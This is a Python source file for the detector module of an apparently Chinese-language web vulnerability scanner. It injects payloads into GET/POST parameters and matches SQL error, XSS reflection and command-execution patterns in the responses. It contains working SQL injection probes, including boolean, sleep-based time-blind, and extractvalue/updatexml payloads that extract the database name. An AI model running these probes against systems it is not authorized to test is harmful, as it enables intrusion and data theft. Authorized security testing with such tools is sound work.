from __future__ import annotations

import re
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .requester import Requester


class Detector:
    def __init__(
        self,
        requester: Requester,
        verbose: bool = False,
        logger: Optional[Callable[[str], None]] = None,
    ) -> None:
        self.requester = requester
        self.verbose = verbose
        self.logger = logger
        self.baseline_length = 0
        self.baseline_text = ""
        self.detection_rules = {
            "sql": {
                "error_patterns": [
                    r"SQL syntax",
                    r"mysql_fetch",
                    r"ORA-\d+",
                    r"Unclosed quotation mark",
                    r"You have an error in your SQL syntax",
                    r"Warning: mysql",
                    r"PostgreSQL",
                    r"SQLite",
                    r"Microsoft OLE DB",
                    r"数据库错误",
                    r"语法错误",
                ]
            },
            "xss": {
                "reflection_patterns": [
                    r"<script>alert",
                    r"<img src=x onerror",
                    r"<svg onload",
                    r"javascript:alert",
                ]
            },
            "cmd": {
                "success_patterns": [
                    r"uid=\d+",
                    r"root:",
                    r"win32",
                    r"Microsoft Windows",
                    r"Directory of",
                ]
            },
        }
        self.db_signatures = {
            "MySQL": [r"MySQL", r"mysql_fetch", r"native_mysql", r"SQL syntax.*MySQL"],
            "PostgreSQL": [r"PostgreSQL", r"pg_query", r"PG::"],
            "Oracle": [r"ORA-\d+", r"Oracle Database"],
            "SQLite": [r"SQLite", r"sqlite_"],
            "Microsoft SQL": [r"Microsoft OLE DB", r"MS SQL", r"@@version"],
        }

    def _log(self, message: str) -> None:
        if self.logger:
            self.logger(message)

    def set_baseline(self, response: Any) -> None:
        self.baseline_length = len(response.text)
        self.baseline_text = response.text
        if self.verbose:
            self._log(f"[DEBUG] 基准响应长度: {self.baseline_length}")

    def detect_vulnerability(
        self, test_point: Dict[str, Any], payload: Dict[str, Any]
    ) -> Dict[str, Any]:
        vuln_type = payload.get("type", "unknown")
        payload_value = payload["payload"]
        url, method, request_data = self._build_test_request(test_point, payload_value)
        response = self.requester.send_request(url, method, request_data)

        if not response:
            return {
                "success": False,
                "vulnerable": False,
                "error": "请求失败",
                "param_name": test_point["param_name"],
                "payload": payload_value,
                "vuln_type": vuln_type,
            }

        is_vulnerable, reason = self._analyze_response(response, vuln_type, payload_value)
        return {
            "success": True,
            "vulnerable": is_vulnerable,
            "reason": reason,
            "status_code": response.status_code,
            "response_length": len(response.text),
            "response_text": response.text if is_vulnerable else "",
            "payload_name": payload.get("name"),
            "payload": payload_value,
            "param_name": test_point["param_name"],
            "url": url,
            "method": method,
            "vuln_type": vuln_type,
        }

    def extract_sql_info(
        self,
        test_point: Dict[str, Any],
        vulnerable_payloads: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        info = {
            "vulnerable": True,
            "param": test_point["param_name"],
            "injection_type": self._detect_injection_type(test_point, vulnerable_payloads),
            "database_type": self._detect_database_type(vulnerable_payloads),
            "database_name": None,
            "usable_payloads": [
                {
                    "name": item.get("payload_name"),
                    "payload": item.get("payload"),
                }
                for item in vulnerable_payloads[:5]
            ],
        }
        if info["database_type"] != "unknown":
            info["database_name"] = self._extract_database_name(test_point)
        return info

    def _detect_injection_type(
        self,
        test_point: Dict[str, Any],
        vulnerable_payloads: List[Dict[str, Any]],
    ) -> str:
        true_response = self._request_with_param(test_point, "1 and 1=1")
        false_response = self._request_with_param(test_point, "1 and 1=2")

        if true_response and false_response and self.baseline_length:
            true_diff = abs(len(true_response.text) - self.baseline_length)
            false_diff = abs(len(false_response.text) - self.baseline_length)
            between_diff = abs(len(true_response.text) - len(false_response.text))
            if true_diff > 30 and false_diff > 30 and between_diff > 20:
                return "数字型注入"
            if between_diff > 50:
                return "布尔盲注"

        quote_response = self._request_with_param(test_point, "'")
        if quote_response and self.baseline_length:
            if abs(len(quote_response.text) - self.baseline_length) > 30:
                return "字符型注入"

        if self._check_time_blind(test_point):
            return "时间盲注"

        payload_values = [item.get("payload", "") for item in vulnerable_payloads]
        if any("'" in value for value in payload_values):
            return "字符型注入"

        return "报错注入"

    def _check_time_blind(self, test_point: Dict[str, Any]) -> bool:
        start = time.time()
        self._request_with_param(test_point, "1 and sleep(3)")
        return (time.time() - start) > 2.5

    def _detect_database_type(self, vulnerable_payloads: List[Dict[str, Any]]) -> str:
        combined_text = " ".join(item.get("response_text", "") for item in vulnerable_payloads)
        for db_type, patterns in self.db_signatures.items():
            for pattern in patterns:
                if re.search(pattern, combined_text, re.IGNORECASE):
                    return db_type
        return "unknown"

    def _extract_database_name(self, test_point: Dict[str, Any]) -> Optional[str]:
        error_payloads = [
            "1' AND extractvalue(1,concat(0x7e,database(),0x7e))-- -",
            "1' AND updatexml(1,concat(0x7e,database(),0x7e),1)-- -",
            "1 AND extractvalue(1,concat(0x7e,database(),0x7e))-- -",
        ]
        for payload in error_payloads:
            response = self._request_with_param(test_point, payload)
            if not response:
                continue
            match = re.search(r"~([a-zA-Z0-9_]+)~", response.text)
            if match:
                return match.group(1)
        return None

    def _request_with_param(
        self, test_point: Dict[str, Any], payload_value: str
    ) -> Optional[Any]:
        url, method, data = self._build_test_request(test_point, payload_value)
        return self.requester.send_request(url, method, data)

    def _build_test_request(
        self,
        test_point: Dict[str, Any],
        payload_value: str,
    ) -> Tuple[str, str, Optional[Dict[str, str]]]:
        param_name = test_point["param_name"]
        point_type = str(test_point["type"]).lower()

        if point_type == "get":
            url = self._replace_get_param(test_point["url"], param_name, payload_value)
            return url, "GET", None

        data = dict(test_point.get("base_data") or {})
        data[param_name] = payload_value
        return test_point["url"], "POST", data

    def _replace_get_param(self, url: str, param_name: str, new_value: str) -> str:
        parsed = urlparse(url)
        query_items = parse_qsl(parsed.query, keep_blank_values=True)
        updated_items = []
        replaced = False
        for key, value in query_items:
            if key == param_name:
                updated_items.append((key, new_value))
                replaced = True
            else:
                updated_items.append((key, value))
        if not replaced:
            updated_items.append((param_name, new_value))
        new_query = urlencode(updated_items, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _analyze_response(
        self,
        response: Any,
        vuln_type: str,
        payload: str,
    ) -> Tuple[bool, str]:
        rules = self.detection_rules.get(vuln_type, {})

        if vuln_type == "sql":
            for pattern in rules.get("error_patterns", []):
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True, f"检测到 SQL 错误特征: {pattern}"
            if self.baseline_length:
                diff = abs(len(response.text) - self.baseline_length)
                if diff > 30:
                    return True, f"响应长度异常变化: {self.baseline_length} -> {len(response.text)}"

        elif vuln_type == "xss":
            if payload in response.text:
                return True, "payload 被直接反射到响应中"
            for pattern in rules.get("reflection_patterns", []):
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True, f"检测到 XSS 特征: {pattern}"

        elif vuln_type == "cmd":
            for pattern in rules.get("success_patterns", []):
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True, f"检测到命令执行特征: {pattern}"

        return False, "未检测到明显漏洞特征"
